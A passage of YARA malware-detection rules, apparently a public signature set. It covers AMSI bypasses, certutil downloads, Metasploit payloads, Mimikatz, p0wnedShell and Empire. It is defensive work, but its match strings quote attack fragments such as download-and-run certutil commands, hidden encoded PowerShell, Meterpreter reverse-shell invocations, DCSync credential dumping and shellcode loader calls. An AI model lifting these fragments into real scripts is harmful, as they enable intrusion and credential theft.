      date = "2017-07-19"
      score = 65
      type = "file"
   strings:
      $s1 = ".GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')." ascii nocase
   condition:
      1 of them
}

rule JS_Suspicious_Obfuscation_Dropbox {
   meta:
      description = "Detects PowerShell AMSI Bypass"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://twitter.com/ItsReallyNick/status/887705105239343104"
      date = "2017-07-19"
      score = 70
   strings:
      $x1 = "j\"+\"a\"+\"v\"+\"a\"+\"s\"+\"c\"+\"r\"+\"i\"+\"p\"+\"t\""
      $x2 = "script:https://www.dropbox.com" ascii
   condition:
      2 of them
}

rule JS_Suspicious_MSHTA_Bypass {
   meta:
      description = "Detects MSHTA Bypass"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://twitter.com/ItsReallyNick/status/887705105239343104"
      date = "2017-07-19"
      score = 70
   strings:
      $s1 = "mshtml,RunHTMLApplication" ascii
      $s2 = "new ActiveXObject(\"WScript.Shell\").Run(" ascii
      $s3 = "/c start mshta j" ascii nocase
   condition:
      2 of them
}

rule JavaScript_Run_Suspicious {
   meta:
      description = "Detects a suspicious Javascript Run command"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://twitter.com/craiu/status/900314063560998912"
      score = 60
      date = "2017-08-23"
   strings:
      $s1 = "w = new ActiveXObject(" ascii
      $s2 = " w.Run(r);" fullword ascii
   condition:
      all of them
}

/* Certutil Rule Improved */

private rule MSI {
   strings:
      $r1 = { 52 00 6F 00 6F 00 74 00 20 00 45 00 6E 00 74 00 72 00 79 }
   condition:
      uint16(0) == 0xCFD0 and $r1
}

rule Certutil_Decode_OR_Download {
   meta:
      description = "Certutil Decode"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      score = 40
      date = "2017-08-29"
   strings:
      $a1 = "certutil -decode " ascii wide
      $a2 = "certutil  -decode " ascii wide
      $a3 = "certutil.exe -decode " ascii wide
      $a4 = "certutil.exe  -decode " ascii wide
      $a5 = "certutil -urlcache -split -f http" ascii wide
      $a6 = "certutil.exe -urlcache -split -f http" ascii wide
   condition:
      ( not MSI and filesize < 700KB and 1 of them )
}

rule Suspicious_JS_script_content {
   meta:
      description = "Detects suspicious statements in JavaScript files"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Research on Leviathan https://goo.gl/MZ7dRg"
      date = "2017-12-02"
      score = 70
      hash1 = "fc0fad39b461eb1cfc6be57932993fcea94fca650564271d1b74dd850c81602f"
   strings:
      $x1 = "new ActiveXObject('WScript.Shell')).Run('cmd /c " ascii
      $x2 = ".Run('regsvr32 /s /u /i:" ascii
      $x3 = "new ActiveXObject('WScript.Shell')).Run('regsvr32 /s" fullword ascii
      $x4 = "args='/s /u /i:" ascii
   condition:
      ( filesize < 10KB and 1 of them )
}

rule Universal_Exploit_Strings {
   meta:
      description = "Detects a group of strings often used in exploit codes"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "not set"
      date = "2017-12-02"
      score = 50
      hash1 = "9b07dacf8a45218ede6d64327c38478640ff17d0f1e525bd392c002e49fe3629"
   strings:
      $s1 = "Exploit" fullword ascii
      $s2 = "Payload" fullword ascii
      $s3 = "CVE-201" ascii
      $s4 = "bindshell"
   condition:
      ( filesize < 2KB and 3 of them )
}

rule VBS_Obfuscated_Mal_Feb18_1  {
   meta:
      description = "Detects malicious obfuscated VBS observed in February 2018"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/zPsn83"
      date = "2018-02-12"
      hash1 = "06960cb721609fe5a857fe9ca3696a84baba88d06c20920370ddba1b0952a8ab"
      hash2 = "c5c0e28093e133d03c3806da0061a35776eed47d351e817709d2235b95d3a036"
      hash3 = "e1765a2b10e2ff10235762b9c65e9f5a4b3b47d292933f1a710e241fe0417a74"
   strings:
      $x1 = "A( Array( (1* 2^1 )+" ascii
      $x2 = ".addcode(A( Array(" ascii
      $x3 = "false:AA.send:Execute(AA.responsetext):end" ascii
      $x4 = "& A( Array(  (1* 2^1 )+" ascii

      $s1 = ".SYSTEMTYPE:NEXT:IF (UCASE(" ascii
      $s2 = "A = STR:next:end function" ascii
      $s3 = "&WSCRIPT.SCRIPTFULLNAME&CHR" fullword ascii
   condition:
      filesize < 600KB and ( 1 of ($x*) or 3 of them )
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-09
   Identifier: MSF Payloads
*/

/* Rule Set ----------------------------------------------------------------- */

rule Msfpayloads_msf {
   meta:
      description = "Metasploit Payloads - file msf.sh"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "320a01ec4e023fb5fbbaef963a2b57229e4f918847e5a49c7a3f631cb556e96c"
   strings:
      $s1 = "export buf=\\" fullword ascii
   condition:
      ( uint16(0) == 0x7865 and filesize < 4KB and ( 10 of ($s*) ) ) or ( all of them )
}

rule Msfpayloads_msf_2 {
   meta:
      description = "Metasploit Payloads - file msf.asp"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "e52f98466b92ee9629d564453af6f27bd3645e00a9e2da518f5a64a33ccf8eb5"
   strings:
      $s1 = "& \"\\\" & \"svchost.exe\"" fullword ascii
      $s2 = "CreateObject(\"Wscript.Shell\")" fullword ascii
      $s3 = "<% @language=\"VBScript\" %>" fullword ascii
   condition:
      all of them
}

rule Msfpayloads_msf_psh {
   meta:
      description = "Metasploit Payloads - file msf-psh.vba"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "5cc6c7f1aa75df8979be4a16e36cece40340c6e192ce527771bdd6463253e46f"
   strings:
      $s1 = "powershell.exe -nop -w hidden -e" ascii
      $s2 = "Call Shell(" fullword ascii
      $s3 = "Sub Workbook_Open()" fullword ascii
   condition:
      all of them
}

rule Msfpayloads_msf_exe {
   meta:
      description = "Metasploit Payloads - file msf-exe.vba"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "321537007ea5052a43ffa46a6976075cee6a4902af0c98b9fd711b9f572c20fd"
   strings:
      $s1 = "'* PAYLOAD DATA" fullword ascii
      $s2 = " = Shell(" ascii
      $s3 = "= Environ(\"USERPROFILE\")" fullword ascii
      $s4 = "'**************************************************************" fullword ascii
      $s5 = "ChDir (" fullword ascii
      $s6 = "'* MACRO CODE" fullword ascii
   condition:
      4 of them
}

rule Msfpayloads_msf_3 {
   meta:
      description = "Metasploit Payloads - file msf.psh"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "335cfb85e11e7fb20cddc87e743b9e777dc4ab4e18a39c2a2da1aa61efdbd054"
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject(" ascii
      $s2 = "public enum MemoryProtection { ExecuteReadWrite = 0x40 }" fullword ascii
      $s3 = ".func]::VirtualAlloc(0,"
      $s4 = ".func+AllocationType]::Reserve -bOr [" ascii
      $s5 = "New-Object System.CodeDom.Compiler.CompilerParameters" fullword ascii
      $s6 = "ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))" fullword ascii
      $s7 = "public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }" fullword ascii
      $s8 = ".func]::CreateThread(0,0,$" fullword ascii
      $s9 = "public enum Time : uint { Infinite = 0xFFFFFFFF }" fullword ascii
      $s10 = "= [System.Convert]::FromBase64String(\"/" ascii
      $s11 = "{ $global:result = 3; return }" fullword ascii
   condition:
      4 of them
}

rule Msfpayloads_msf_4 {
   meta:
      description = "Metasploit Payloads - file msf.aspx"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "26b3e572ba1574164b76c6d5213ab02e4170168ae2bcd2f477f246d37dbe84ef"
   strings:
      $s1 = "= VirtualAlloc(IntPtr.Zero,(UIntPtr)" ascii
      $s2 = ".Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);" ascii
      $s3 = "[System.Runtime.InteropServices.DllImport(\"kernel32\")]" fullword ascii
      $s4 = "private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;" fullword ascii
      $s5 = "private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);" fullword ascii
   condition:
      4 of them
}

rule Msfpayloads_msf_exe_2 {
   meta:
      description = "Metasploit Payloads - file msf-exe.aspx"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "3a2f7a654c1100e64d8d3b4cd39165fba3b101bbcce6dd0f70dae863da338401"
   strings:
      $x1 = "= new System.Diagnostics.Process();" fullword ascii
      $x2 = ".StartInfo.UseShellExecute = true;" fullword ascii
      $x3 = ", \"svchost.exe\");" ascii
      $s4 = " = Path.GetTempPath();" ascii
   condition:
      all of them
}

rule Msfpayloads_msf_5 {
   meta:
      description = "Metasploit Payloads - file msf.msi"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "7a6c66dfc998bf5838993e40026e1f400acd018bde8d4c01ef2e2e8fba507065"
   strings:
      $s1 = "required to install Foobar 1.0." fullword ascii
      $s2 = "Copyright 2009 The Apache Software Foundation." fullword wide
      $s3 = "{50F36D89-59A8-4A40-9689-8792029113AC}" fullword ascii
   condition:
      all of them
}

rule Msfpayloads_msf_6 {
   meta:
      description = "Metasploit Payloads - file msf.vbs"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "8d6f55c6715c4a2023087c3d0d7abfa21e31a629393e4dc179d31bb25b166b3f"
   strings:
      $s1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
      $s2 = "= CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s3 = ".GetSpecialFolder(2)" ascii
      $s4 = ".Write Chr(CLng(\"" ascii
      $s5 = "= \"4d5a90000300000004000000ffff00" ascii
      $s6 = "For i = 1 to Len(" ascii
      $s7  = ") Step 2" ascii
   condition:
      5 of them
}

rule Msfpayloads_msf_7 {
   meta:
      description = "Metasploit Payloads - file msf.vba"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "425beff61a01e2f60773be3fcb74bdfc7c66099fe40b9209745029b3c19b5f2f"
   strings:
      $s1 = "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal" ascii
      $s2 = "= VirtualAlloc(0, UBound(Tsw), &H1000, &H40)" fullword ascii
      $s3 = "= RtlMoveMemory(" ascii
   condition:
      all of them
}

rule Msfpayloads_msf_8 {
   meta:
      description = "Metasploit Payloads - file msf.ps1"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "519717e01f0cb3f460ef88cd70c3de8c7f00fb7c564260bd2908e97d11fde87f"
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")]" fullword ascii
      $s2 = "[DllImport(\"msvcrt.dll\")]" fullword ascii
      $s3 = "-Name \"Win32\" -namespace Win32Functions -passthru" fullword ascii
      $s4 = "::VirtualAlloc(0,[Math]::Max($" ascii
      $s5 = ".Length,0x1000),0x3000,0x40)" ascii
      $s6 = "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);" fullword ascii
      $s7 = "::memset([IntPtr]($" ascii
   condition:
      6 of them
}

rule Msfpayloads_msf_cmd {
   meta:
      description = "Metasploit Payloads - file msf-cmd.ps1"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "9f41932afc9b6b4938ee7a2559067f4df34a5c8eae73558a3959dd677cb5867f"
   strings:
      $x1 = "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e" ascii
   condition:
      all of them
}

rule Msfpayloads_msf_9 {
   meta:
      description = "Metasploit Payloads - file msf.war - contents"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "e408678042642a5d341e8042f476ee7cef253871ef1c9e289acf0ee9591d1e81"
   strings:
      $s1 = "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1)" fullword ascii
      $s2 = ".concat(\".exe\");" fullword ascii
      $s3 = "[0] = \"chmod\";" ascii
      $s4 = "= Runtime.getRuntime().exec(" ascii
      $s5 = ", 16) & 0xff;" ascii

      $x1 = "4d5a9000030000000" ascii
   condition:
      4 of ($s*) or (
         uint32(0) == 0x61356434 and $x1 at 0
      )
}

rule Msfpayloads_msf_10 {
   meta:
      description = "Metasploit Payloads - file msf.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "3cd74fa28323c0d64f45507675ac08fb09bae4dd6b7e11f2832a4fbc70bb7082"
   strings:
      $s1 = { 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff ac 3c 61 }
      $s2 = { 01 c7 38 e0 75 f6 03 7d f8 3b 7d 24 75 e4 58 8b }
      $s3 = { 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 5f 5f }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule Msfpayloads_msf_svc {
   meta:
      description = "Metasploit Payloads - file msf-svc.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "2b02c9c10577ee0c7590d3dadc525c494122747a628a7bf714879b8e94ae5ea1"
   strings:
      $s1 = "PAYLOAD:" fullword ascii
      $s2 = ".exehll" ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and all of them )
}

rule Msfpayloads_msf_11 {
   meta:
      description = "Metasploit Payloads - file msf.hta"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "d1daf7bc41580322333a893133d103f7d67f5cd8a3e0f919471061d41cf710b6"
   strings:
      $s1 = ".ExpandEnvironmentStrings(\"%PSModulePath%\") + \"..\\powershell.exe\") Then" fullword ascii
      $s2 = "= CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s3 = "= CreateObject(\"Wscript.Shell\") " fullword ascii
   condition:
      all of them
}

rule Msfpayloads_msf_ref {
   meta:
      description = "Metasploit Payloads - file msf-ref.ps1"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09"
      hash1 = "4ec95724b4c2b6cb57d2c63332a1dd6d4a0101707f42e3d693c9aab19f6c9f87"
   strings:
      $s1 = "kernel32.dll WaitForSingleObject)," ascii
      $s2 = "= ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')" ascii
      $s3 = "GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object" ascii
      $s4 = ".DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual'," ascii
      $s5 = "= [System.Convert]::FromBase64String(" ascii
      $s6 = "[Parameter(Position = 0, Mandatory = $True)] [Type[]]" fullword ascii
      $s7 = "DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard," ascii
   condition:
      5 of them
}


rule power_pe_injection
{
   meta:
      description      = "PowerShell with PE Reflective Injection"
      author         = "Benjamin DELPY (gentilkiwi)"
   strings:
      $str_loadlib   = "0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9"
   condition:
      $str_loadlib
}

rule HKTL_Mimikatz_SkeletonKey_in_memory_Aug20_1 {
   meta:
      description = "Detects Mimikatz SkeletonKey in Memory"
      author = "Florian Roth"
      reference = "https://twitter.com/sbousseaden/status/1292143504131600384?s=12"
      date = "2020-08-09"
   strings:
      $x1 = { 60 ba 4f ca c7 44 24 34 dc 46 6c 7a c7 44 24 38 
              03 3c 17 81 c7 44 24 3c 94 c0 3d f6 }
   condition:
      1 of them
}
/*
	Yara Rule Set
	Author: YarGen Rule Generator
	Date: 2016-05-21
	Identifier: No PowerShell
*/

rule No_PowerShell {
	meta:
		description = "Detects an C# executable used to circumvent PowerShell detection - file nps.exe"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/Ben0xA/nps"
		date = "2016-05-21"
		score = 80
		hash1 = "64f811b99eb4ae038c88c67ee0dc9b150445e68a2eb35ff1a0296533ae2edd71"
	strings:
		$s1 = "nps.exe -encodedcommand {base64_encoded_command}" fullword wide
		$s2 = "c:\\Development\\ghps\\nps\\nps\\obj\\x86\\Release\\nps.pdb" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 40KB and ( 1 of ($s*) ) ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-01-14
   Identifier: p0wnedShell
*/

/* Rule Set ----------------------------------------------------------------- */

rule p0wnedPowerCat {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPowerCat.cs"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "6a3ba991d3b5d127c4325bc194b3241dde5b3a5853b78b4df1bce7cbe87c0fdf"
   strings:
      $x1 = "Now if we point Firefox to http://127.0.0.1" fullword ascii
      $x2 = "powercat -l -v -p" fullword ascii
      $x3 = "P0wnedListener" fullword ascii
      $x4 = "EncodedPayload.bat" fullword ascii
      $x5 = "powercat -c " fullword ascii
      $x6 = "Program.P0wnedPath()" ascii
      $x7 = "Invoke-PowerShellTcpOneLine" fullword ascii
   condition:
      ( uint16(0) == 0x7375 and filesize < 150KB and 1 of them ) or ( 2 of them )
}

rule Hacktool_Strings_p0wnedShell {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedShell.cs"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "e1f35310192416cd79e60dba0521fc6eb107f3e65741c344832c46e9b4085e60"
   strings:
      $x1 = "Invoke-TokenManipulation" fullword ascii
      $x2 = "windows/meterpreter" fullword ascii
      $x3 = "lsadump::dcsync" fullword ascii
      $x4 = "p0wnedShellx86" fullword ascii
      $x5 = "p0wnedShellx64" fullword ascii
      $x6 = "Invoke_PsExec()" fullword ascii
      $x7 = "Invoke-Mimikatz" fullword ascii
      $x8 = "Invoke_Shellcode()" fullword ascii
      $x9 = "Invoke-ReflectivePEInjection" ascii
   condition:
      1 of them
}

rule p0wnedPotato {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPotato.cs"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "aff2b694a01b48ef96c82daf387b25845abbe01073b76316f1aab3142fdb235b"
   strings:
      $x1 = "Invoke-Tater" fullword ascii
      $x2 = "P0wnedListener.Execute(WPAD_Proxy);" fullword ascii
      $x3 = " -SpooferIP " ascii
      $x4 = "TaterCommand()" ascii
      $x5 = "FileName = \"cmd.exe\"," fullword ascii
   condition:
      1 of them
}

rule p0wnedExploits {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedExploits.cs"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "54548e7848e742566f5596d8f02eca1fd2cbfeae88648b01efb7bab014b9301b"
   strings:
      $x1 = "Pshell.RunPSCommand(Whoami);" fullword ascii
      $x2 = "If succeeded this exploit should popup a System CMD Shell" fullword ascii
   condition:
      all of them
}

rule p0wnedShellx64 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedShellx64.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "d8b4f5440627cf70fa0e0e19e0359b59e671885f8c1855517211ba331f48c449"
   strings:
      $x1 = "Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9Pjgb/+kPPhv9Sjp01Wf" wide
      $x2 = "Invoke-TokenManipulation" wide
      $x3 = "-CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"" fullword wide
      $x4 = "CommandShell with Local Administrator privileges :)" fullword wide
      $x5 = "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " fullword wide
   condition:
      1 of them
}

rule p0wnedListenerConsole {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedListenerConsole.cs"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "d2d84e65fad966a8556696fdaab5dc8110fc058c9e9caa7ea78aa00921ae3169"
   strings:
      $x1 = "Invoke_ReflectivePEInjection" fullword wide
      $x5 = "p0wnedShell> " fullword wide
      $x6 = "Resources.Get_PassHashes" fullword wide
      $s7 = "Invoke_CredentialsPhish" fullword wide
      $s8 = "Invoke_Shellcode" fullword wide
      $s9 = "Resources.Invoke_TokenManipulation" fullword wide
      $s10 = "Resources.Port_Scan" fullword wide
      $s20 = "Invoke_PowerUp" fullword wide
   condition:
      1 of them
}

rule p0wnedBinaries {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedBinaries.cs"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "fd7014625b58d00c6e54ad0e587c6dba5d50f8ca4b0f162d5af3357c2183c7a7"
   strings:
      $x1 = "Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9" ascii
      $x2 = "wpoWAB+LCAAAAAAABADs/QeyK7uOBYhORUNIenL+E2vBA0ympH3erY4f8Tte3TpbUiY9YRbcGK91vVKtr+tV3v/B/yr/m1vD/+DvNOVb+V/f" ascii
      $x3 = "mo0MAB+LCAAAAAAABADsXQl24zqu3YqXII6i9r+xJ4AACU4SZcuJnVenf/9OxbHEAcRwcQGu62NbHsrax/Iw+3/hP5b+VzuH/4WfVeDf8n98" ascii
      $x4 = "LE4CAB+LCAAAAAAABADsfQmW2zqu6Fa8BM7D/jf2hRmkKNuVm/Tt9zunkipb4giCIGb2/prhFUt5hVe+/sNP4b+pVvwPn+OQp/LT9ge/+" ascii
      $x5 = "XpMCAB+LCAAAAAAABADsfQeWIzmO6FV0hKAn73+xL3iAwVAqq2t35r/tl53VyhCDFoQ3Y7zW9Uq1vq5Xef/CT+X/59bwFz6nKU/lp+8P/" ascii
      $x6 = "STwAAB+LCAAAAAAABADtWwmy6yoO3YqXgJjZ/8ZaRwNgx/HNfX/o7qqUkxgzCM0SmLR2jHBQzkc4En9xZbvHUuSLMnWv9ateK/70ilStR" ascii
      $x7 = "namespace p0wnedShell" fullword ascii
   condition:
      1 of them
}

rule p0wnedAmsiBypass {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedAmsiBypass.cs"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      hash1 = "345e8e6f38b2914f4533c4c16421d372d61564a4275537e674a2ac3360b19284"
   strings:
      $x1 = "Program.P0wnedPath()" fullword ascii
      $x2 = "namespace p0wnedShell" fullword ascii
      $x3 = "H4sIAAAAAAAEAO1YfXRUx3WflXalFazQgiVb5nMVryzxIbGrt/rcFRZIa1CQYEFCQnxotUhP2pX3Q337HpYotCKrPdbmoQQnkOY0+BQCNKRpe" ascii
   condition:
      1 of them
}

rule p0wnedShell_outputs {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - from files p0wnedShell.cs, p0wnedShell.cs"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14"
      super_rule = 1
      hash1 = "e1f35310192416cd79e60dba0521fc6eb107f3e65741c344832c46e9b4085e60"
   strings:
      $s1 = "[+] For this attack to succeed, you need to have Admin privileges." fullword ascii
      $s2 = "[+] This is not a valid hostname, please try again" fullword ascii
      $s3 = "[+] First return the name of our current domain." fullword ascii
   condition:
      1 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-02-05
	Identifier: Powerkatz
*/

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-08-03
   Identifier: PowerShell Hacktools
   Reference: https://github.com/p3nt4/PowerShdll
*/

rule PowerShdll {
   meta:
      description = "Detects hack tool PowerShdll"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/p3nt4/PowerShdll"
      date = "2017-08-03"
      hash1 = "4d33bc7cfa79d7eefc5f7a99f1b052afdb84895a411d7c30045498fd4303898a"
      hash2 = "f999db9cc3a0719c19f35f0e760f4ce3377b31b756d8cd91bb8270acecd7be7d"
   strings:
      $x1 = "rundll32 PowerShdll,main -f <path>" fullword wide
      $x2 = "\\PowerShdll.dll" fullword ascii
      $x3 = "rundll32 PowerShdll,main <script>" fullword wide
   condition:
      1 of them
}
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-08-07
	Identifier: Empire Powershell Agent
	Comment: Reduced Subset
*/

rule Empire_Invoke_BypassUAC {
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-BypassUAC.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "ab0f900a6915b7497313977871a64c3658f3e6f73f11b03d2d33ca61305dc6a8"
	strings:
		$s1 = "$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory" fullword ascii 
		$s2 = "$proc = Start-Process -WindowStyle Hidden notepad.exe -PassThru" fullword ascii 
		$s3 = "$Payload = Invoke-PatchDll -DllBytes $Payload -FindString \"ExitThread\" -ReplaceString \"ExitProcess\"" fullword ascii 
		$s4 = "$temp = [System.Text.Encoding]::UNICODE.GetBytes($szTempDllPath)" fullword ascii 
	condition:
		filesize < 1200KB and 3 of them
}

rule Empire_lib_modules_trollsploit_message {
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file message.py"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "71f2258177eb16eafabb110a9333faab30edacf67cb019d5eab3c12d095655d5"
	strings:
		$s1 = "script += \" -\" + str(option) + \" \\\"\" + str(values['Value'].strip(\"\\\"\")) + \"\\\"\"" fullword ascii 
		$s2 = "if option.lower() != \"agent\" and option.lower() != \"computername\":" fullword ascii 
		$s3 = "[String] $Title = 'ERROR - 0xA801B720'" fullword ascii 
		$s4 = "'Value'         :   'Lost contact with the Domain Controller.'" fullword ascii 
	condition:
		filesize < 10KB and 3 of them
}

rule Empire_Persistence {
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file Persistence.psm1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "ae8875f7fcb8b4de5cf9721a9f5a9f7782f7c436c86422060ecdc5181e31092f"
	strings:
		$s1 = "C:\\PS>Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -V" ascii 
		$s2 = "# Execute the following to remove the user-level persistent payload" fullword ascii 
		$s3 = "$PersistantScript = $PersistantScript.ToString().Replace('EXECUTEFUNCTION', \"$PersistenceScriptName -Persist\")" fullword ascii 
	condition:
		filesize < 108KB and 1 of them
}

rule Empire_portscan {
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file portscan.py"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "b355efa1e7b3681b1402e22c58ce968795ef245fd08a0afb948d45c173e60b97"
	strings:
